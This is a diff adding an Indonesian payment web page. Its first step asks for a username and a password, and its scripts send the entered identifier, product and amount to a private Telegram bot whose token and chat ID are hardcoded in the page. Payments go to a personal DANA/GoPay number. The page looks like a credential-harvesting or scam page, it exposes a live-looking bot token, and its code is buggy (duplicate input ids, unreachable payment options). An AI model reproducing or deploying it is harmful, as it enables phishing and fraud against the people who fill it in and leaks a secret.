@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pembayaran</title>
+<link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+<style>
+body {
+  background: linear-gradient(135deg, #c8e5ff 0%, #ffffff 100%);
+  font-family: 'Poppins', sans-serif;
+}
+.card {
+  background: white;
+  padding: 20px;
+  border-radius: 14px;
+  box-shadow: 0 4px 15px rgba(0, 0, 0, .15);
+  margin-top: 20px;
+  transition: all 0.5s ease;
+  opacity: 1;
+}
+.card.hidden { opacity: 0; height: 0; padding: 0; margin-top: 0; overflow: hidden; transition: all 0.5s ease; }
+.btn {
+  font-weight: bold;
+  cursor: pointer;
+  margin-bottom: 10px;
+  border-radius: 8px;
+  transition: all 0.3s ease;
+}
+.btn:hover { transform: scale(1.03); }
+</style>
+</head>
+<body class="p-4">
+
+<!-- STEP 1 -->
+<div id="step1" class="card max-w-md mx-auto text-center">
+  <h2 class="text-xl font-bold mb-4">Masukkan Data Pembayaran</h2>
+
+
+  <label class="font-semibold mb-1 block">username</label>
+  <input id="input-step1" class="w-full border rounded px-3 py-2 mb-4" placeholder="contoh: DuniaDigital_id">
+  <label class="font-semibold mb-1 block">pasword</label>
+  <input id="input-step1" class="w-full border rounded px-3 py-2 mb-4" placeholder="contoh: duniadigital">
+
+  <label class="font-semibold mb-1 block">Pilih Metode:</label>
+  <select id="methodSelect" class="w-full border rounded px-3 py-2 mb-4">
+    <option value="qris">QRIS</option>
+  </select>
+  <button class="btn w-full py-3 bg-blue-600 hover:bg-blue-700 text-white font-bold rounded" onclick="goToStep2()">Lanjut</button>
+</div>
+
+<!-- STEP 2 -->
+<div id="step2" class="hidden">
+
+  <!-- QRIS -->
+  <div id="div-qris" class="card max-w-md mx-auto hidden text-center">
+    <h2 class="text-xl font-bold mb-4">Pembayaran QRIS</h2>
+    <p id="product-qris"></p>
+    <p id="price-qris" class="mb-4"></p>
+    <img id="qrisImg" src="https://smail.my.id/cloud/DphoIyQW1" alt="QRIS"
+         class="mx-auto rounded-lg mb-4 w-64 h-64 object-contain"/>
+    <button class="btn w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded mb-2" onclick="downloadQR()">Download QR</button>
+    <button class="btn w-full bg-green-600 hover:bg-green-700 text-white py-3 rounded" id="btnQrisDone">Selesai</button>
+  </div>
+
+  <!-- DANA -->
+  <div id="div-dana" class="card max-w-md mx-auto hidden text-center">
+    <h2 class="text-xl font-bold mb-4">Pembayaran DANA</h2>
+    <p id="product-dana"></p>
+    <p id="price-dana" class="mb-4"></p>
+    <p class="font-semibold">No Dana Tujuan:</p>
+    <div class="border p-2 rounded mb-2">085860605722</div>
+    <button class="btn w-full bg-blue-500 hover:bg-blue-600 text-white py-3 rounded mb-3" onclick="copyDana()">Salin Nomor</button>
+    <label class="font-semibold block">No HP Anda:</label>
+    <input id="input-hp-dana" class="w-full border rounded px-3 py-2 mb-3">
+    <button class="btn w-full bg-green-600 hover:bg-green-700 text-white py-3 rounded" id="payBtnDana">Sudah Bayar</button>
+  </div>
+
+  <!-- GOPAY -->
+  <div id="div-gopay" class="card max-w-md mx-auto hidden text-center">
+    <h2 class="text-xl font-bold mb-4">Pembayaran GoPay</h2>
+    <p id="product-gopay"></p>
+    <p id="price-gopay" class="mb-4"></p>
+    <p class="font-semibold">No GoPay Tujuan:</p>
+    <div class="border p-2 rounded mb-2">085860605722</div>
+    <button class="btn w-full bg-purple-600 hover:bg-purple-700 text-white py-3 rounded mb-3" onclick="copyGopay()">Salin Nomor</button>
+    <label class="font-semibold block">No HP Anda:</label>
+    <input id="input-hp-gopay" class="w-full border rounded px-3 py-2 mb-3">
+    <button class="btn w-full bg-green-600 hover:bg-green-700 text-white py-3 rounded" id="payBtnGopay">Sudah Bayar</button>
+  </div>
+</div>
+
+<script>
+const urlParams = new URLSearchParams(window.location.search);
+const productName = decodeURIComponent(urlParams.get("paket") || "Produk Tidak Diketahui");
+const productPrice = parseInt(urlParams.get("harga")) || 0;
+
+const bot = {
+  chatId: "8330927007",
+  token: "8360075953:AAGv3RnjtLjtaAwzAPJpGNTBFDNkOJQtf-I"
+};
+
+function goToStep2(){
+  const method = document.getElementById('methodSelect').value;
+  const tujuan = document.getElementById('input-step1').value.trim();
+  if(!tujuan){ alert("Masukkan nomor tujuan / ID terlebih dahulu!"); return; }
+
+  document.getElementById('step1').classList.add('hidden');
+  document.getElementById('step2').classList.remove('hidden');
+  document.getElementById('div-qris').classList.add('hidden');
+  document.getElementById('div-dana').classList.add('hidden');
+  document.getElementById('div-gopay').classList.add('hidden');
+
+  if(method==='qris'){
+    const div=document.getElementById('div-qris');
+    div.classList.remove('hidden');
+    document.getElementById('product-qris').innerText = `Nama Produk: ${productName}`;
+    document.getElementById('price-qris').innerText = `Nominal: Rp ${productPrice.toLocaleString()}`;
+    div.dataset.tujuan = tujuan;
+  }
+  if(method==='dana'){
+    const div=document.getElementById('div-dana');
+    div.classList.remove('hidden');
+    document.getElementById('product-dana').innerText = `Nama Produk: ${productName}`;
+    document.getElementById('price-dana').innerText = `Nominal: Rp ${productPrice.toLocaleString()}`;
+    document.getElementById('input-hp-dana').value = tujuan;
+  }
+  if(method==='gopay'){
+    const div=document.getElementById('div-gopay');
+    div.classList.remove('hidden');
+    document.getElementById('product-gopay').innerText = `Nama Produk: ${productName}`;
+    document.getElementById('price-gopay').innerText = `Nominal: Rp ${productPrice.toLocaleString()}`;
+    document.getElementById('input-hp-gopay').value = tujuan;
+  }
+}
+
+function copyDana(){ navigator.clipboard.writeText("085860605722"); alert("Nomor Dana disalin!"); }
+function copyGopay(){ navigator.clipboard.writeText("085860605722"); alert("Nomor GoPay disalin!"); }
+
+function downloadQR(){
+  const imgURL=document.getElementById("qrisImg").src;
+  const link=document.createElement("a");
+  link.href=imgURL;
+  link.download="qris-wisnu.png";
+  document.body.appendChild(link);
+  link.click();
+  document.body.removeChild(link);
+}
+
+// --- KONFIRMASI QRIS ---
+document.getElementById('btnQrisDone').onclick = async () => {
+  const tujuan = document.getElementById('div-qris').dataset.tujuan;
+  const msg = `✅ Pembayaran QRIS\nNama Produk: ${productName}\nNomor Tujuan: ${tujuan}\nNominal: Rp ${productPrice.toLocaleString()}`;
+  await fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(msg)}`);
+  alert("Konfirmasi QRIS terkirim!");
+  window.location.href = "succesr.htm";
+};
+
+// --- KONFIRMASI DANA ---
+document.getElementById('payBtnDana').onclick = async () => {
+  const nomor = document.getElementById('input-hp-dana').value;
+  const msg = `✅ Pembayaran DANA\nNama Produk: ${productName}\nNomor Tujuan: ${nomor}\nNominal: Rp ${productPrice.toLocaleString()}`;
+  await fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(msg)}`);
+  alert("Konfirmasi DANA terkirim!");
+  window.location.href = "success.html";
+};
+
+// --- KONFIRMASI GOPAY ---
+document.getElementById('payBtnGopay').onclick = async () => {
+  const nomor = document.getElementById('input-hp-gopay').value;
+  const msg = `✅ Pembayaran GoPay\nNama Produk: ${productName}\nNomor Tujuan: ${nomor}\nNominal: Rp ${productPrice.toLocaleString()}`;
+  await fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(msg)}`);
+  alert("Konfirmasi GoPay terkirim!");
+  window.location.href = "success.html";
+};
+</script>
+</body>
+</html>
